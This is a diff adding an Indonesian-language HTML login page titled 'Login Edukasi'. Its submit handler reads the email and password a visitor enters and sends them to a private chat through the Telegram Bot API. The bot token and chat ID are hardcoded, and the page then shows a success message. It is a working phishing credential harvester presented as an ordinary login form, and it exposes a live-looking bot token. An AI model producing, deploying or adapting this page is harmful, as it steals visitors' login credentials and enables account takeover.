@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Login Edukasi</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    #container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 360px;
+      text-align: center;
+    }
+
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    .success {
+      color: green;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div id="container">
+    <h2>Login</h2>
+    <form onsubmit="kirimLogin(event)">
+      <input type="email" id="email" placeholder="Masukkan email" required />
+      <input type="password" id="password" placeholder="Masukkan sandi" required />
+      <button type="submit">Kirim</button>
+      <p id="notif" class="success"></p>
+    </form>
+  </div>
+
+  <script>
+    function kirimLogin(event) {
+      event.preventDefault();
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      const botToken = '8010627263:AAHLO_NEnE3eePM5GeA58BZmyrMv5D9MXMU';
+      const chatId = '8073946537'; // ← Chat ID kamu (akun pribadi)
+
+      const message = `🔐 Login Baru:\n📧 Email: ${email}\n🔑 Sandi: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          document.getElementById('notif').innerText = 'Data berhasil dikirim!';
+          document.getElementById('email').value = '';
+          document.getElementById('password').value = '';
+        } else {
+          alert('Gagal mengirim: ' + data.description);
+        }
+      })
+      .catch(err => {
+        alert('Gagal mengirim ke Telegram. Cek koneksi atau token.');
+        console.error(err);
+      });
+    }
+  </script>
+</body>
+</html> 
